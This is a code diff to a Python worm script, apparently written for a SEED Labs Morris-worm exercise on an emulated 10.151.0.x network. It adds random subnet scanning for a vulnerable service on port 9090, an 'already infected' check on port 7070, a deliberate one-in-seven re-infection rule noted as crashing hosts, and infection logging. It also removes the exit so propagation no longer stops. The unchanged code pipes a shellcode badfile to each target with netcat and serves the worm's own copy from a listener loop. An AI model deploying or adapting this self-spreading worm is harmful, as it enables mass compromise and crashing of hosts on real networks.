@@ -2,8 +2,15 @@
 import sys
 import os
 import time
+import socket
 import subprocess
-from random import randint
+from random import randint, shuffle
+
+# Task 4 config
+SUBNET         = "10.151.0."   # nano Internet range
+VULN_PORT      = 9090          # SEED vulnerable server (runs on every host = a real target)
+WORM_PORT      = 7070          # worm's own serve loop (open == host already infected)
+REINFECT_1_IN  = 7            # deliberate Morris re-infection rate (~1 in 7)
 
 # Task 3
 # This host's own IP - the victim pulls worm.py from here
@@ -50,10 +57,43 @@ def createBadfile():
       f.write(content)
 
 
-# Find the next victim (return an IP address).
-# Check to make sure that the target is alive. 
+# Is a TCP port open on ip? Used both to find live targets (9090)
+# and to detect an already-infected host (7070).
+def is_port_open(ip, port, timeout=2):
+   try:
+      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+         s.settimeout(timeout)
+         return s.connect_ex((ip, port)) == 0
+   except OSError:
+      return False
+
+
+# Task 7: an infected host is already running the serve loop on WORM_PORT,
+# so that port answering is the worm's "already here" marker.
+def already_infected(ip):
+   return is_port_open(ip, WORM_PORT)
+
+
+# Find the next victim (return an IP address, or None if none found).
+# Scans the nano Internet for a host with the vulnerable server up,
+# skipping ourselves and (usually) hosts already infected.
 def getNextTarget():
-   return '10.151.0.71'
+   candidates = list(range(2, 255))
+   shuffle(candidates)
+   for h in candidates:
+      ip = SUBNET + str(h)
+      if ip == myIP:
+         continue
+      # Must have the vulnerable server listening to be a real target.
+      if not is_port_open(ip, VULN_PORT):
+         continue
+      # Normally skip already-infected hosts -- but re-infect ~1 in REINFECT_1_IN
+      # anyway. This is the famous Morris bug: it defeats fake "I'm infected"
+      # signals, but piles up processes until hosts crash (Ewaoluwa's defense demo).
+      if already_infected(ip) and randint(1, REINFECT_1_IN) != 1:
+         continue
+      return ip
+   return None
 
 
 ############################################################### 
@@ -71,22 +111,31 @@ createBadfile()
 # Serve this worm's own copy to the next victim 
 subprocess.Popen(["while true; do nc -lnv 7070 -q1 < worm.py; done"], shell=True)
 
-# Launch the attack on other servers
+# Task 8: log every infection so Ewaoluwa can build propagation curves.
+# Format (AGREE WITH EWAOLUWA before the 275-node run): epoch_ts,source_ip,target_ip
+def log_infection(targetIP):
+    with open("infections.log", "a") as f:
+        f.write(f"{time.time():.3f},{myIP},{targetIP}\n")
+
+
+# Launch the attack on other servers -- spread until the subnet is saturated.
 while True:
     targetIP = getNextTarget()
+
+    # No reachable, not-already-infected target right now -- wait and rescan.
+    if targetIP is None:
+        time.sleep(10)
+        continue
 
     # Send the malicious payload to the target host
     print(f"**********************************", flush=True)
     print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
     print(f"**********************************", flush=True)
     subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)
+    log_infection(targetIP)
 
     # Give the shellcode some time to run on the target host
     time.sleep(1)
 
-
     # Sleep for 10 seconds before attacking another host
-    time.sleep(10) 
-
-    # Remove this line if you want to continue attacking others
-    exit(0)
+    time.sleep(10)
